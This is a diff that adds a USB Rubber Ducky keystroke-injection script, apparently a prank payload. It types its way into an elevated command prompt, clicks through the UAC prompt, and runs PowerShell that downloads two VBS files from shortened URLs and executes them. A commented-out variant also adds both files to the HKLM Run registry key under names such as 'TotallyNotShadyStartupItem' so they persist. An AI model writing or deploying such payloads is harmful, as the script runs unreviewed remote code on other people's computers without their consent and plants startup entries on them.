@@ -1,0 +1,24 @@
+DELAY 1000
+
+DELAY 500
+ESCAPE
+DELAY 100
+CONTROL ESCAPE
+DELAY 100
+STRING cmd
+DELAY 500
+MENU
+DELAY 100
+DOWNARROW
+DELAY 100
+ENTER
+
+DELAY 500
+ALT y
+
+DELAY 200
+STRING powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/Q0ahyr','%userprofile%\rickroll.vbs'); && start %userprofile%\rickroll.vbs && powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/sT2cos','%userprofile%\volup.vbs'); && start %userprofile%\volup.vbs && exit
+REM powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/Q0ahyr','%userprofile%\rickroll.vbs'); && start %userprofile%\rickroll.vbs && reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v TotallyNotShadyStartupItem /d %userprofile%\rickroll.vbs && powershell (new-object System.Net.WebClient).DownloadFile('https://goo.gl/sT2cos','%userprofile%\volup.vbs'); && start %userprofile%\volup.vbs && reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v TotallyNotShadyStartupItem2 /d %userprofile%\volup.vbs && exit
+DELAY 200
+ENTER
+
